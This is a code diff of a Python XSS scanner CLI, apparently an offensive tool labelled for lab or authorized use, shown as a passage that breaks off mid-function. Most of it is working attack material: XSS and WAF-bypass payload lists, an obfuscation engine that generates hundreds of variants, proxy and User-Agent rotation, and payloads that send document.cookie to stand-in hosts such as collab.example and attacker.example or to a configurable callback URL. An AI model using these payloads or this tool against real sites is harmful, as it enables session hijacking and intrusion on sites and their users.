@@ -1,1853 +1,978 @@
-import os
-import re
-import sys
-import time
+#!/usr/bin/env python3
+"""
+XOMLSX XSS Scanner — polished CLI + engine
+Authorized / lab testing only.
+"""
+from __future__ import annotations
+
+import html as _html
 import json
+import os
 import random
+import re
 import string
+import sys
 import threading
-import base64
-import hashlib
-import zlib
-from collections import deque
-import requests
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
-from html.parser import HTMLParser
+from dataclasses import asdict, dataclass, field
+from datetime import datetime, timezone
+from typing import Any, Dict, List, Optional, Tuple
+from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
 
-# ---------------------------------------------------------------------------
-# Ensure project root (folder that contains xss.py + xsspor/) is on sys.path
-# so `import xsspor` works no matter how / from where this file is launched.
-# ---------------------------------------------------------------------------
-_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
-if _THIS_DIR and _THIS_DIR not in sys.path:
-    sys.path.insert(0, _THIS_DIR)
-# Do NOT add parent dir — avoids colliding with other packages named scanner/socks/etc.
-
-# ---------------------------------------------------------------------------
-# Load xsspor package (engine + chain). Show real error if it fails.
-# ---------------------------------------------------------------------------
-HAS_XSSPOR = False
-_XSSPOR_ERR = None
-DetectionEngine = ScanConfig = Finding = None
-XssProxyPool = None
-xsspor_verify = None
-all_payloads = detect_context = severity_for = xss_crawl = None
-ChainAdvanced = hash_password = packet_to_d = d_to_packet = None
+import urllib3
 
 try:
-    from xsspor import (
-        DetectionEngine, ScanConfig, Finding,
-        ProxyPool as XssProxyPool,
-        verify_xss as xsspor_verify,
-        all_payloads, detect_context, severity_for,
-        crawl as xss_crawl,
-        ChainAdvanced, hash_password, packet_to_d, d_to_packet,
-    )
+    import requests
+except ImportError:
+    print("[!] requests required: pip install requests")
+    sys.exit(1)
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ── optional packages ────────────────────────────────────────────────────────
+try:
+    from xsspor import DetectionEngine, ScanConfig, all_payloads  # type: ignore
     HAS_XSSPOR = True
-except Exception as _e1:
-    _XSSPOR_ERR = _e1
-    # Fallback: load submodules one-by-one so a single missing dep does not kill everything
-    try:
-        from xsspor.engine import DetectionEngine, ScanConfig, Finding
-        from xsspor.proxy import ProxyPool as XssProxyPool
-        from xsspor.browser import verify_xss as xsspor_verify
-        from xsspor.payloads import all_payloads
-        from xsspor.context import detect_context, severity_for
-        from xsspor.crawler import crawl as xss_crawl
-        HAS_XSSPOR = True
-        _XSSPOR_ERR = None
-    except Exception as _e2:
-        _XSSPOR_ERR = _e2
-        HAS_XSSPOR = False
-    try:
-        from xsspor.chain import ChainAdvanced, hash_password, packet_to_d, d_to_packet
-    except Exception as _e3:
-        if _XSSPOR_ERR is None:
-            _XSSPOR_ERR = _e3
+    XSSPOR_ERR = None
+except Exception as e:
+    HAS_XSSPOR = False
+    XSSPOR_ERR = e
+    DetectionEngine = ScanConfig = all_payloads = None  # type: ignore
 
-# ---------------------------------------------------------------------------
-# Inline Chain fallback (for frozen onefile builds where xsspor is missing)
-# ---------------------------------------------------------------------------
-if ChainAdvanced is None or not callable(hash_password):
-    try:
-        import hmac as _hmac
-        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
-        from cryptography.hazmat.primitives.kdf.hkdf import HKDF as _HKDF
-        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC as _PBKDF2
-        from cryptography.hazmat.primitives import hashes as _hashes
+try:
+    from xsspor.chain import ChainAdvanced, hash_password, packet_to_d, d_to_packet  # type: ignore
+    HAS_CHAIN = True
+except Exception:
+    HAS_CHAIN = False
+    ChainAdvanced = hash_password = packet_to_d = d_to_packet = None  # type: ignore
 
-        def hash_password(password, salt=None, iterations=100_000):
-            if not isinstance(password, str) or not password:
-                raise ValueError("password must be non-empty string")
-            if salt is None:
-                salt = b"aac2-chain-v2.1-static-salt"
-            kdf = _PBKDF2(
-                algorithm=_hashes.SHA256(),
-                length=32,
-                salt=salt,
-                iterations=iterations,
-            )
-            return kdf.derive(password.encode("utf-8"))
-
-        def packet_to_d(packet):
-            raw = json.dumps(packet, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
-            return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
-
-        def d_to_packet(d):
-            padding = "=" * ((4 - len(d) % 4) % 4)
-            raw = base64.urlsafe_b64decode(d + padding)
-            return json.loads(raw.decode("utf-8"))
-
-        class ChainAdvanced:
-            VERSION = "2.1"
-            BLOCK_SIZE = 64
-            MAX_REPLAY_WINDOW = 1000
-            PBKDF2_ITERATIONS = 100_000
-
-            def __init__(self, initial_key=None, session_salt=None, compress=False, created_at=None):
-                if initial_key is None:
-                    initial_key = os.urandom(32)
-                if not isinstance(initial_key, bytes) or len(initial_key) != 32:
-                    raise ValueError("initial_key must be 32 bytes")
-                if session_salt is None:
-                    session_salt = os.urandom(16)
-                if not isinstance(session_salt, bytes) or len(session_salt) < 8:
-                    raise ValueError("session_salt must be at least 8 bytes")
-                self.initial_key = initial_key
-                self.current_key = initial_key
-                self.session_salt = session_salt
-                self.stage = 0
-                self.compress = compress
-                self.created_at = created_at if created_at is not None else time.time()
-                self.chain_hash = hashlib.sha256(session_salt).digest()
-                self.seen_stages = deque(maxlen=self.MAX_REPLAY_WINDOW)
-
-            def _derive_stage_key(self):
-                hkdf = _HKDF(
-                    algorithm=_hashes.SHA256(), length=32,
-                    salt=self.session_salt, info=b"stage|" + str(self.stage).encode(),
-                )
-                return hkdf.derive(self.current_key)
-
-            def _ratchet(self):
-                hkdf = _HKDF(
-                    algorithm=_hashes.SHA256(), length=32,
-                    salt=self.session_salt, info=b"ratchet|" + str(self.stage).encode(),
-                )
-                self.current_key = hkdf.derive(self.current_key)
-                self.chain_hash = hashlib.sha256(self.chain_hash + self.current_key).digest()
-
-            def _pad(self, data):
-                pad_len = self.BLOCK_SIZE - (len(data) % self.BLOCK_SIZE)
-                if pad_len == 0:
-                    pad_len = self.BLOCK_SIZE
-                return data + bytes([pad_len] * pad_len)
-
-            def _unpad(self, data):
-                if not data:
-                    raise ValueError("empty data")
-                pad_len = data[-1]
-                if pad_len < 1 or pad_len > self.BLOCK_SIZE:
-                    raise ValueError(f"invalid padding length: {pad_len}")
-                if data[-pad_len:] != bytes([pad_len] * pad_len):
-                    raise ValueError("padding corruption")
-                return data[:-pad_len]
-
-            def _compute_mac(self, data):
-                return _hmac.new(self.current_key, data, hashlib.sha256).digest()
-
-            def _build_aad(self):
-                return (
-                    b"v" + self.VERSION.encode()
-                    + b"|stage:" + str(self.stage).encode()
-                    + b"|hash:" + self.chain_hash[:8].hex().encode()
-                )
-
-            def encode(self, data):
-                if not isinstance(data, (bytes, bytearray)):
-                    raise TypeError("data must be bytes")
-                if self.compress:
-                    data = zlib.compress(data, level=9)
-                padded = self._pad(data)
-                stage_key = self._derive_stage_key()
-                nonce = os.urandom(12)
-                aesgcm = _AESGCM(stage_key)
-                ciphertext = aesgcm.encrypt(nonce, padded, self._build_aad())
-                mac = self._compute_mac(ciphertext)
-                packet = {
-                    "v": self.VERSION,
-                    "stage": self.stage,
-                    "nonce": nonce.hex(),
-                    "ciphertext": ciphertext.hex(),
-                    "mac": mac.hex(),
-                }
-                self._ratchet()
-                self.stage += 1
-                return packet
-
-            def decode(self, packet):
-                if packet.get("v") != self.VERSION:
-                    raise ValueError(f"unsupported version: {packet.get('v')}")
-                stage = packet.get("stage")
-                if stage != self.stage:
-                    raise ValueError(f"stage mismatch: expected {self.stage}, got {stage}")
-                if stage in self.seen_stages:
-                    raise ValueError(f"replay detected for stage {stage}")
-                stage_key = self._derive_stage_key()
-                nonce = bytes.fromhex(packet["nonce"])
-                ciphertext = bytes.fromhex(packet["ciphertext"])
-                mac = bytes.fromhex(packet["mac"])
-                if not _hmac.compare_digest(mac, self._compute_mac(ciphertext)):
-                    raise ValueError("MAC verification failed")
-                aesgcm = _AESGCM(stage_key)
-                padded = aesgcm.decrypt(nonce, ciphertext, self._build_aad())
-                data = self._unpad(padded)
-                if self.compress:
-                    data = zlib.decompress(data)
-                self.seen_stages.append(stage)
-                self._ratchet()
-                self.stage += 1
-                return data
-
-            def reset(self):
-                self.current_key = self.initial_key
-                self.stage = 0
-                self.chain_hash = hashlib.sha256(self.session_salt).digest()
-                self.seen_stages.clear()
-
-        # mark chain usable via inline fallback
-        _XSSPOR_ERR = None
-    except Exception as _e_inline:
-        # cryptography missing — leave ChainAdvanced as None
-        if _XSSPOR_ERR is None:
-            _XSSPOR_ERR = _e_inline
+try:
+    from playwright.sync_api import sync_playwright  # type: ignore
+    HAS_PLAYWRIGHT = True
+except Exception:
+    HAS_PLAYWRIGHT = False
+    sync_playwright = None  # type: ignore
 
 
-def _require_xsspor(feature="xsspor"):
-    """Return True if required components are available; else print help and False."""
-    need_chain = "chain" in feature.lower()
-    engine_ok = HAS_XSSPOR and DetectionEngine is not None
-    chain_ok = (
-        ChainAdvanced is not None
-        and callable(hash_password)
-        and callable(packet_to_d)
-        and callable(d_to_packet)
-    )
-    if need_chain and chain_ok:
-        return True
-    if (not need_chain) and engine_ok:
-        return True
-    print(f"\n{C.CRM}[!] {feature} not available{C.R}")
-    if _XSSPOR_ERR is not None:
-        print(f"{C.YEL}    reason: {type(_XSSPOR_ERR).__name__}: {_XSSPOR_ERR}{C.R}")
-    if need_chain and not chain_ok:
-        print(f"{C.YEL}    ChainAdvanced/hash_password is None (package not bundled or cryptography missing){C.R}")
-    print(f"{C.D}    Fix:")
-    print(f"    1) Run from folder that contains xss.py AND xsspor/")
-    print(f"    2) pip install cryptography PySocks requests  (or: pip install -r requirements.txt)")
-    print(f"    3) Rebuild exe with --include-package=xsspor and cryptography in Nuitka{C.R}")
-    return False
-
-
+# ── palette ──────────────────────────────────────────────────────────────────
 class C:
-    R='\033[0m'; B='\033[1m'; D='\033[2m'
-    RED='\033[91m'; GRN='\033[92m'; YEL='\033[93m'
-    CYN='\033[96m'; WHT='\033[97m'
-    GLD='\033[38;2;255;215;0m'
-    PUR='\033[38;2;191;64;255m'
-    NEO='\033[38;2;0;255;213m'
-    CRM='\033[38;2;220;20;60m'
+    R = "\033[0m"
+    B = "\033[1m"
+    D = "\033[2m"
+    RED = "\033[91m"
+    GRN = "\033[92m"
+    YEL = "\033[93m"
+    CYN = "\033[96m"
+    WHT = "\033[97m"
+    GLD = "\033[38;2;255;215;0m"
+    NEO = "\033[38;2;0;255;213m"
+    PRP = "\033[38;2;191;64;255m"
+    CRM = "\033[38;2;220;20;60m"
+    GRY = "\033[38;2;110;110;120m"
+    LIME = "\033[38;2;180;255;0m"
 
 
-USE_BROWSER_VERIFY = {"enabled": False}
-ALERT_TYPE = {"mode": "domain"}
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+]
 
-
-def mutate_case(p, **k):
-    return re.sub(r'[a-zA-Z]+',
-                  lambda m: "".join(c.upper() if random.random() > .5 else c.lower() for c in m.group(0)), p)
-
-def mutate_html_entity(p, **k):
-    t = {"(":"&#40;",")":"&#41;","'":"&#39;",'"':"&#34;"}
-    return "".join(t.get(c, c) for c in p)
-
-def mutate_hex_entity(p, **k):
-    t = {"a":"&#x61;","l":"&#x6c;","e":"&#x65;","r":"&#x72;","t":"&#x74;"}
-    return "".join(t.get(c, c) for c in p)
-
-def mutate_percent(p, **k):
-    return "".join(f"%{ord(c):02X}" if (not c.isalnum() and c not in "/.-_" and random.random() > .5) else c for c in p)
-
-def mutate_double_percent(p, **k):
-    return "".join(f"%25{ord(c):02X}" if random.random() > .7 else (f"%{ord(c):02X}" if random.random() > .5 else c) for c in p)
-
-def mutate_whitespace(p, **k):
-    return p.replace(" ", random.choice(["\t","\n","\r","/","/*x*/","/**/","\x0c","%09","%0a"]))
-
-def mutate_null_byte(p, **k):
-    i = random.randint(0, max(0, len(p)-1))
-    return p[:i] + "%00" + p[i:]
-
-def mutate_slash(p, **k):
-    return re.sub(r'\s+', lambda _: random.choice(["/*x*/","/**/","/","\t"]), p)
-
-def mutate_unicode(p, **k):
-    m = {"<":"\uff1c",">":"\uff1e","=":"\uff1d","(":"\uff08",")":"\uff09","'":"\uff07",'"':"\uff02"}
-    return "".join(m.get(c, c) if random.random() > .7 else c for c in p)
-
-def mutate_hex_js(p, **k):
-    return re.sub(r'alert|eval|onload|onerror',
-                  lambda m: "".join(f"\\x{ord(c):02x}" for c in m.group(0)), p, flags=re.I)
-
-def mutate_unicode_js(p, **k):
-    return re.sub(r'alert|eval',
-                  lambda m: "".join(f"\\u{ord(c):04x}" for c in m.group(0)), p, flags=re.I)
-
-def mutate_js_fragment(p, **k):
-    def s(m):
-        x = m.group(0); h = len(x)//2; return f"{x[:h]}'+'{x[h:]}"
-    return re.sub(r'alert|eval', s, p, flags=re.I)
-
-def mutate_bracket(p, **k):
-    o = random.choice(["top","self","window","parent","this"])
-    return re.sub(r'\balert\s*\(', f"{o}['al'+'ert'](", p)
-
-def mutate_bracket_simple(p, **k):
-    o = random.choice(["top","self","window"])
-    return re.sub(r'\balert\s*\(', f"{o}['alert'](", p)
-
-def mutate_atob(p, **k):
-    import base64
-    def e(m):
-        b = base64.b64encode(f"alert('{m.group(1)}')".encode()).decode()
-        return f"eval(atob('{b}'))"
-    return re.sub(r"alert\(['\"]([^'\"]+)['\"]\)", e, p)
-
-def mutate_backtick(p, **k):
-    return re.sub(r"alert\((['\"])([^'\"]+)\1\)", r"alert`\2`", p)
-
-def mutate_optional_chain(p, **k):
-    return re.sub(r'\balert\s*\(', "alert?.(", p)
-
-def mutate_tag_break(p, **k):
-    return re.sub(r"<(\w+)", lambda m: f"<{m.group(1)}\n", p, count=1)
-
-def mutate_attr_break(p, **k):
-    return re.sub(r'(on\w+)',
-                  lambda m: m.group(1)[:2] + random.choice(["\n","\t","/**/","/*x*/"]) + m.group(1)[2:],
-                  p, flags=re.I)
-
-def mutate_space_slash(p, **k):
-    return p.replace("<svg ", "<svg/").replace("<img ", "<img/")
-
-def mutate_no_quotes(p, **k):
-    return p.replace("'x", "x").replace("'", "")
-
-
-MUTATIONS = {
-    "case": mutate_case, "html_entity": mutate_html_entity, "hex_entity": mutate_hex_entity,
-    "percent": mutate_percent, "double_pct": mutate_double_percent,
-    "whitespace": mutate_whitespace, "null_byte": mutate_null_byte,
-    "slash": mutate_slash, "unicode": mutate_unicode, "hex_js": mutate_hex_js,
-    "unicode_js": mutate_unicode_js, "js_fragment": mutate_js_fragment,
-    "bracket": mutate_bracket, "bracket_simple": mutate_bracket_simple,
-    "atob": mutate_atob, "backtick": mutate_backtick, "optional_chain": mutate_optional_chain,
-    "tag_break": mutate_tag_break, "attr_break": mutate_attr_break,
-    "space_slash": mutate_space_slash, "no_quotes": mutate_no_quotes,
+WAF_SIGS = {
+    "cloudflare": [r"cloudflare", r"cf-ray", r"attention required"],
+    "akamai": [r"akamai", r"access denied"],
+    "aws_waf": [r"aws.?waf", r"request blocked"],
+    "modsecurity": [r"mod_security", r"not acceptable"],
+    "imperva": [r"imperva", r"incapsula"],
+    "sucuri": [r"sucuri"],
 }
 
-
-def chain(p, techs):
-    for t in techs:
-        fn = MUTATIONS.get(t)
-        if fn:
-            try: p = fn(p)
-            except Exception: pass
-    return p
-
-
-def generate_mixed(base, max_count=500):
-    import itertools
-    names = list(MUTATIONS.keys())
-    res = []
-    for n in names:
-        p = chain(base, [n])
-        if p != base: res.append((n, p))
-    for a, b in itertools.combinations(names, 2):
-        res.append((f"{a}+{b}", chain(base, [a, b])))
-    triples = list(itertools.combinations(names, 3))
-    random.shuffle(triples)
-    for c in triples[:120]:
-        res.append(("+".join(c), chain(base, list(c))))
-    w = {"case":3,"whitespace":3,"html_entity":2,"percent":2,"slash":2,"attr_break":2,
-         "tag_break":2,"hex_js":1,"js_fragment":1,"bracket":1,"atob":1,"unicode":1,
-         "double_pct":1,"null_byte":1,"backtick":1,"space_slash":2,"no_quotes":1,
-         "hex_entity":2,"unicode_js":1,"bracket_simple":1,"optional_chain":1}
-    pool = list(w.keys()); ww = [w[k] for k in pool]
-    while len(res) < max_count:
-        k = random.randint(2, 6)
-        combo = random.choices(pool, weights=ww, k=k)
-        res.append(("+".join(combo), chain(base, combo)))
-    seen = set(); out = []
-    for tag, p in res:
-        if p in seen: continue
-        seen.add(p); out.append((tag, p))
-    return out[:max_count]
+COMMON_PARAMS = [
+    "q", "s", "search", "query", "id", "page", "name", "keyword", "term",
+    "redirect", "url", "next", "return", "returnUrl", "callback", "ref",
+    "cat", "category", "type", "view", "file", "path", "dir", "folder",
+    "user", "username", "email", "msg", "message", "comment", "title",
+    "text", "content", "data", "input", "value", "key", "token",
+]
 
 
-def get_alert(m):
-    mode = ALERT_TYPE["mode"]
-    if mode == "domain":
-        return "alert(document.domain)"
+# ── UI helpers ───────────────────────────────────────────────────────────────
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def pause():
+    try:
+        input(f"\n{C.GRY}  [Enter] continue{C.R}")
+    except EOFError:
+        pass
+
+
+def box(title: str, rows: List[Tuple[str, str]], width: int = 62) -> None:
+    print(f"{C.GLD}+{'-' * width}+{C.R}")
+    if title:
+        pad = max(width - len(title), 0)
+        print(f"{C.GLD}|{C.R}  {C.B}{title}{C.R}{' ' * max(pad - 2, 0)}")
+        print(f"{C.GLD}+{'-' * width}+{C.R}")
+    for key, label in rows:
+        line = f"  {C.GLD}{key}{C.R}  {label}"
+        print(f"{C.GLD}|{C.R}{line}")
+    print(f"{C.GLD}+{'-' * width}+{C.R}")
+
+
+def prompt(label: str, default: str = "") -> str:
+    suf = f" {C.GRY}[{default}]{C.R}" if default else ""
+    try:
+        v = input(f"{C.NEO}{label}{C.R}{suf}: ").strip()
+    except EOFError:
+        return default
+    return v or default
+
+
+def yn(label: str, default: bool = False) -> bool:
+    d = "y" if default else "n"
+    v = prompt(f"{label} (y/n)", d).lower()
+    return v.startswith("y")
+
+
+def banner():
+    clear()
+    print(f"""
+{C.PRP}{C.B}  ██╗  ██╗███████╗███████╗
+  ╚██╗██╔╝██╔════╝██╔════╝
+   ╚███╔╝ ███████╗███████╗
+   ██╔██╗ ╚════██║╚════██║
+  ██╔╝ ██╗███████║███████║
+  ╚═╝  ╚═╝╚══════╝╚══════╝{C.R}
+{C.GLD}{C.B}          XSS Scanner  ·  reflection · context · bypass{C.R}
+{C.GRY}          lab / authorized targets only{C.R}
+  {C.GRN if HAS_XSSPOR else C.YEL}[xsspor {'OK' if HAS_XSSPOR else 'off'}]{C.R}  \
+{C.GRN if HAS_CHAIN else C.YEL}[chain {'OK' if HAS_CHAIN else 'off'}]{C.R}  \
+{C.GRN if HAS_PLAYWRIGHT else C.YEL}[browser {'OK' if HAS_PLAYWRIGHT else 'off'}]{C.R}
+""")
+
+
+def status_line(msg: str, kind: str = "info"):
+    colors = {"ok": C.GRN, "err": C.CRM, "warn": C.YEL, "info": C.CYN, "hit": C.LIME}
+    mark = {"ok": "[+]", "err": "[!]", "warn": "[~]", "info": "[*]", "hit": "[!]"}
+    c = colors.get(kind, C.CYN)
+    print(f"  {c}{mark.get(kind, '[*]')} {msg}{C.R}")
+
+
+# ── field / URL helpers ──────────────────────────────────────────────────────
+def normalize_url(url: str) -> str:
+    url = (url or "").strip()
+    if not url:
+        return ""
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+    return url
+
+
+def params_from_url(url: str) -> List[str]:
+    return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
+
+
+def inject_param(url: str, param: str, value: str) -> str:
+    p = urlparse(url)
+    qs = parse_qs(p.query, keep_blank_values=True)
+    qs[param] = [value]
+    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(qs, doseq=True), p.fragment))
+
+
+def ensure_fields(url: str, method: str, data: Optional[Dict[str, str]]) -> Tuple[str, List[str], Dict[str, str]]:
+    """
+    Guarantee at least one injectable field.
+    GET: use query params; if none, append ?q=test
+    POST: use provided data; if empty, default {"q": "test"}
+    """
+    method = method.upper()
+    data = dict(data or {})
+    if method == "GET":
+        fields = params_from_url(url)
+        if not fields:
+            # auto-seed common probe param
+            join = "&" if "?" in url else "?"
+            url = url + join + "q=test"
+            fields = ["q"]
+            status_line("no query params — seeded ?q=test", "warn")
+        return url, fields, data
+    # POST
+    if not data:
+        data = {"q": "test"}
+        status_line("no POST body — using q=test", "warn")
+    return url, list(data.keys()), data
+
+
+def parse_post_body(raw: str) -> Dict[str, str]:
+    raw = (raw or "").strip()
+    if not raw:
+        return {}
+    if raw.startswith("{"):
+        try:
+            obj = json.loads(raw)
+            return {str(k): str(v) for k, v in obj.items()}
+        except Exception:
+            pass
+    out: Dict[str, str] = {}
+    for part in raw.split("&"):
+        if "=" in part:
+            k, v = part.split("=", 1)
+            out[k.strip()] = v.strip()
+        elif part.strip():
+            out[part.strip()] = ""
+    return out
+
+
+# ── payloads ─────────────────────────────────────────────────────────────────
+def make_marker() -> str:
+    return "mk" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "mk"
+
+
+ALERT_MODE = {"mode": "domain", "callback": ""}
+
+
+def alert_js(marker: str) -> str:
+    mode = ALERT_MODE.get("mode", "domain")
+    if mode == "unique":
+        return f"alert('{marker}')"
     if mode == "cookie":
         return "alert(document.cookie)"
     if mode == "location":
         return "alert(window.location.href)"
     if mode == "callback":
-        return "fetch('//collab.example/'+document.cookie)"
-    return f"alert('{m}')"
+        cb = ALERT_MODE.get("callback") or "https://example.com/xss"
+        return f"fetch('{cb}?c='+document.cookie)"
+    return "alert(document.domain)"
 
 
-def base_payloads(m):
-    a = get_alert(m)
+def base_payloads(marker: str) -> List[Tuple[str, str]]:
+    """(tag, payload) — reflection + context coverage."""
+    a = alert_js(marker)
     return [
-        # ── Classic HTML ──
-        f"<svg onload={a}>",
-        f"<img src=x onerror={a}>",
-        f"<body onload={a}>",
-        f"<input autofocus onfocus={a}>",
-        f"<details open ontoggle={a}>",
-        f"<video><source onerror={a}>",
-        f"<audio src=x onerror={a}>",
-        f"<script>{a}</script>",
-        f"<iframe srcdoc=\"<script>{a}</script>\">",
-        f"<object data=\"javascript:{a}\">",
-
-        # ── SVG / MathML (sanitizer bypass) ──
-        f"<svg><script>{a}</script></svg>",
-        f"<svg><animate onbegin={a} attributeName=x>",
-        f"<svg><set attributeName=onmouseover onend={a}>",
-        f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror={a}>",
-        f"<math><annotation-xml encoding=\"text/html\"><img src=x onerror={a}></annotation-xml>",
-
-        # ── Attribute context ──
-        f"\" autofocus onfocus={a} x=\"",
-        f"\" onmouseover={a} x=\"",
-        f"\" onpointerover={a} x=\"",
-        f"'><svg/onload={a}>",
-        f"\"><img src=x onerror={a}>",
-
-        # ── JS context ──
-        f"';{a}//",
-        f"'-{a}-'",
-        f"</script><script>{a}</script>",
-        f"\\';{a}//",
-
-        # ── URL context ──
-        f"javascript:{a}",
-        f"data:text/html,<script>{a}</script>",
-
-        # ── CSP bypass ──
-        f"<script src=\"//attacker.example/x.js\"></script>",
-        f"<link rel=\"preload\" href=\"//attacker.example/x.js\" as=\"script\">",
-        f"<base href=\"//attacker.example/\">",
-
-        # ── Blind XSS ──
-        f"<script src=\"//collab.example/x.js\"></script>",
-        f"<img src=x onerror=\"fetch('//collab.example/'+btoa(document.cookie))\">",
+        ("script", f"<script>{a}</script>"),
+        ("script-ns", f"<script>{a}</script>".replace("script", "scr\x00ipt") if False else f"<script>{a}</script>"),
+        ("img-onerror", f"<img src=x onerror={a}>"),
+        ("svg-onload", f"<svg/onload={a}>"),
+        ("body-onload", f"<body onload={a}>"),
+        ("iframe-srcdoc", f"<iframe srcdoc=\"<script>{a}</script>\">"),
+        ("details-ontoggle", f"<details open ontoggle={a}>"),
+        ("input-onfocus", f"<input onfocus={a} autofocus>"),
+        ("video-onerror", f"<video><source onerror={a}>"),
+        ("math-xlink", f"<math><mtext></mtext></math><script>{a}</script>"),
+        ("a-javascript", f"<a href=javascript:{a}>x</a>"),
+        ("event-quote-break", f"\" onmouseover={a} x=\""),
+        ("event-apos-break", f"' onmouseover={a} x='"),
+        ("attr-gt-break", f"><script>{a}</script>"),
+        ("template-lit", f"<img src=x onerror=`{a}`>"),
+        ("svg-anim", f"<svg><animate onbegin={a} attributeName=x dur=1s>"),
+        ("object-data", f"<object data=\"javascript:{a}\">"),
+        ("marquee", f"<marquee onstart={a}>x</marquee>"),
+        ("raw-js", a),
+        ("marker-only", marker),
     ]
 
 
+def bypass_payloads(marker: str) -> List[Tuple[str, str]]:
+    """WAF / filter evasion set."""
+    a = alert_js(marker)
+    payloads = [
+        ("case-mix", f"<ScRiPt>{a}</ScRiPt>"),
+        ("tag-break", f"<scr<script>ipt>{a}</script>"),
+        ("null-in-tag", f"<scr\x00ipt>{a}</script>"),
+        ("html-entity", _html.escape(f"<script>{a}</script>").replace("&lt;script&gt;", "<script>") if False else f"&lt;script&gt;{a}&lt;/script&gt;"),
+        ("hex-entity", f"&#x3c;script&#x3e;{a}&#x3c;/script&#x3e;"),
+        ("dec-entity", f"&#60;script&#62;{a}&#60;/script&#62;"),
+        ("js-unicode", f"<script>\\u0061lert(document.domain)</script>"),
+        ("js-hex", f"<script>\\x61lert(document.domain)</script>"),
+        ("atob", f"<script>eval(atob('{__import__('base64').b64encode(a.encode()).decode()}'))</script>"),
+        ("fromcharcode", f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in a)}))</script>"),
+        ("svg-case", f"<SvG/OnLoAd={a}>"),
+        ("img-space", f"<img src=x onerror = {a}>"),
+        ("img-slash", f"<img/src=x/onerror={a}>"),
+        ("img-nl", f"<img src=x\nonerror={a}>"),
+        ("svg-data", f"<svg><script>{a}</script></svg>"),
+        ("iframe-js", f"<iframe src=javascript:{a}>"),
+        ("object-js", f"<object data=javascript:{a}>"),
+        ("embed-js", f"<embed src=javascript:{a}>"),
+        ("form-action", f"<form action=javascript:{a}><input type=submit>"),
+        ("button-forma", f"<form><button formaction=javascript:{a}>x</button></form>"),
+        ("meta-refresh", f"<meta http-equiv=refresh content=\"0;url=javascript:{a}\">"),
+        ("link-import", f"<link rel=import href=\"data:text/html,<script>{a}</script>\">"),
+        ("double-urlenc", f"%253Cscript%253E{a}%253C%252Fscript%253E"),
+        ("plus-space", f"<script>{a}</script>".replace(" ", "+")),
+        ("tab-break", f"<script\t>{a}</script>"),
+        ("comment-break", f"<script>/*{marker}*/{a}</script>"),
+        ("template", f"<template><script>{a}</script></template>"),
+        ("math-script", f"<math><script>{a}</script></math>"),
+        ("xss-polyglot", f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/{a}//'>"),
+        ("waf-concat", f"<script>window['al'+'ert'](document['dom'+'ain'])</script>"),
+    ]
+    # clean broken html-entity experiment
+    payloads = [(t, p) for t, p in payloads if p]
+    return payloads
 
-def normalize_proxy(line):
-    line = line.strip()
-    if not line or line.startswith("#"): return None
+
+# ── proxy pool ───────────────────────────────────────────────────────────────
+def normalize_proxy(line: str) -> Optional[str]:
+    line = (line or "").strip()
+    if not line or line.startswith("#"):
+        return None
     if "://" not in line:
         line = "http://" + line
-    scheme = line.split("://", 1)[0].lower()
-    if scheme not in ("http", "https", "socks4", "socks5"):
-        return None
     return line
 
 
-def load_proxies_file(path):
-    if not os.path.exists(path): return []
-    out = []
-    with open(path, encoding="utf-8", errors="ignore") as f:
-        for line in f:
-            p = normalize_proxy(line)
-            if p: out.append(p)
-    return out
-
-
-def load_proxies_pasted():
-    print(f"\n{C.NEO}Paste proxies{C.R} {C.D}(one per line, empty line to finish){C.R}")
-    proxies = []
-    while True:
-        try: line = input()
-        except EOFError: break
-        if not line.strip():
-            if proxies: break
-            continue
-        p = normalize_proxy(line)
-        if p:
-            proxies.append(p)
-            if len(proxies) % 100 == 0:
-                print(f"{C.D}  ... {len(proxies)} loaded{C.R}")
-    return proxies
-
-
-def check_proxies(proxies, timeout=8):
-    if not proxies: return []
-    print(f"\n{C.NEO}Checking {len(proxies)} proxies...{C.R}")
-    alive = []; lock = threading.Lock()
-
-    def test(p):
-        try:
-            r = requests.get("http://httpbin.org/ip",
-                             proxies={"http": p, "https": p},
-                             timeout=timeout, verify=False)
-            if r.status_code == 200:
-                with lock: alive.append(p)
-        except Exception: pass
-
-    with ThreadPoolExecutor(max_workers=50) as ex:
-        list(ex.map(test, proxies))
-    print(f"{C.GRN}[+] Alive: {len(alive)}/{len(proxies)}{C.R}")
-    return alive
-
-
 class ProxyPool:
-    def __init__(self, proxies):
-        self.proxies = list(proxies)
-        self.index = 0
-        self.lock = threading.Lock()
-        self.dead = set()
-        self.assign = {}
+    def __init__(self, proxies: List[str]):
+        self.proxies = [p for p in (normalize_proxy(x) for x in proxies) if p]
+        self._i = 0
+        self._lock = threading.Lock()
 
-    def get(self):
-        if not self.proxies: return None
-        with self.lock:
-            ok = [p for p in self.proxies if p not in self.dead]
-            if not ok: return None
-            p = ok[self.index % len(ok)]; self.index += 1
+    def get(self) -> Optional[str]:
+        if not self.proxies:
+            return None
+        with self._lock:
+            p = self.proxies[self._i % len(self.proxies)]
+            self._i += 1
             return p
 
-    def get_for(self, payload):
